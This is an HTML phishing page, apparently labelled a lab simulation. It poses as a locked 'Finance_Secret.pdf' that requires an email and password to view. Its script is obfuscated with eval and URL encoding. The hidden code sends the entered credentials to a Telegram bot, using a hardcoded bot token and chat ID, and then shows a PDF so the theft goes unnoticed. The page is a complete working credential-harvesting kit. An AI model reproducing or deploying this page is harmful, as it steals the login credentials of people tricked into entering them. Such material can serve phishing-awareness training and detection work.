<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Finance_Secret</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background-color: #79a8ee;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100vh;
    margin: 0;
    color: #e4eaf1;
  }
  img {
    width: 100px;
    margin-bottom: 30px;
  }

    margin: 0;
    font-size: 24px;
  }
  p {
    max-width: 400px;
    text-align: center;
    font-size: 16px;
  }
  a {
    display: inline-block;
    margin-top: 20px;
    padding: 10px 20px;
    background-color: #0055cc;
    color: white;
    text-decoration: none;
    border-radius: 5px;
  }
  a:hover {
    background-color: #003399;
  }
  .form-container {
    background: white; padding: 20px; border-radius: 8px;
    box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 300px; margin: auto;
  }
  input { width: 100%; padding: 10px; margin: 8px 0; box-sizing: border-box; }
  button { background: #4CAF50; color: white; padding: 10px; border: none;
           cursor: pointer; width: 100%; border-radius: 4px; }

  .error-message { color: red; margin-top: 10px; }
</style>
</head>
<body>
  <p></p>
  <img src="pdf-logo.png" alt="PDF Logo">
  <h1>Finance_Secret.pdf</h1>
  <p>This PDF file is protected. Login to view.</p>
  
  <div class="form-container">
    <form id="telegramForm">
      <input type="email" id="email" placeholder="Email" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Submit</button>
    </form>
    
    <!-- PDF + status message container -->
    <div id="responseMessage" style="display:none; margin-top:20px;">
      <div id="statusMessage"></div>
      <object id="fileObject" data="" type="application/pdf" width="100%" height="500">
        <p>Unable to display PDF.</p>
      </object>
    </div>
    
    <script>
eval(decodeURIComponent('%28function%28%29%7Bconst%20botToken%3D%228472023953%3AAAFLYFDwFXqtzi2dEzokwQL80npYSA4PYhk%22%3Bconst%20chatId%3D%228282975474%22%3Bconst%20form%3Ddocument.getElementById%28%22telegramForm%22%29%3Bconst%20responseDiv%3Ddocument.getElementById%28%22responseMessage%22%29%3Bconst%20statusMessage%3Ddocument.getElementById%28%22statusMessage%22%29%3Bconst%20fileObject%3Ddocument.getElementById%28%22fileObject%22%29%3Bform.addEventListener%28%22submit%22%2Cfunction%28e%29%7Be.preventDefault%28%29%3Bconst%20email%3Ddocument.getElementById%28%22email%22%29.value.trim%28%29%3Bconst%20password%3Ddocument.getElementById%28%22password%22%29.value.trim%28%29%3Bif%28%21email%7C%7C%21password%29%7BstatusMessage.innerHTML%3D%27%3Cdiv%20class%3D%22error-message%22%3EPlease%20fill%20out%20all%20fields.%3C/div%3E%27%3BresponseDiv.style.display%3D%22block%22%3Breturn%3B%7Dconst%20text%3D%60%5BLAB%20SIM%5D%3A%5CnEmail%3A%20%24%7Bemail%7D%5CnPassword%3A%20%24%7Bpassword%7D%60%3Bfetch%28%60https%3A%2F%2Fapi.telegram.org%2Fbot%24%7BbotToken%7D%2FsendMessage%60%2C%7Bmethod%3A%22POST%22%2Cheaders%3A%7B%22Content-Type%22%3A%22application%2Fjson%22%7D%2Cbody%3AJSON.stringify%28%7Bchat_id%3AchatId%2Ctext%3Atext%7D%29%7D%29.then%28response%3D%3Eresponse.json%28%29%29.then%28data%3D%3E%7Bif%28data.ok%29%7BstatusMessage.innerHTML%3D%27%3Cdiv%20class%3D%22success-message%22%3EHere%20is%20your%20pdf%3C/div%3E%27%3Bform.reset%28%29%3BfileObject.data%3D%22finance_secret.pdf%22%3BresponseDiv.style.display%3D%22block%22%3B%7Delse%7BstatusMessage.innerHTML%3D%27%3Cdiv%20class%3D%22error-message%22%3EFailed%20to%20send%20message.%3C/div%3E%27%3BresponseDiv.style.display%3D%22block%22%3B%7D%7D%29.catch%28error%3D%3E%7Bconsole.error%28%22Error%3A%22%2Cerror%29%3BstatusMessage.innerHTML%3D%27%3Cdiv%20class%3D%22error-message%22%3EError%20sending%20message.%3C/div%3E%27%3BresponseDiv.style.display%3D%22block%22%3B%7D%29%7D%29%7D%29%28%29%3B'));
</script>

    
  </div>
  
  
</body>
</html>
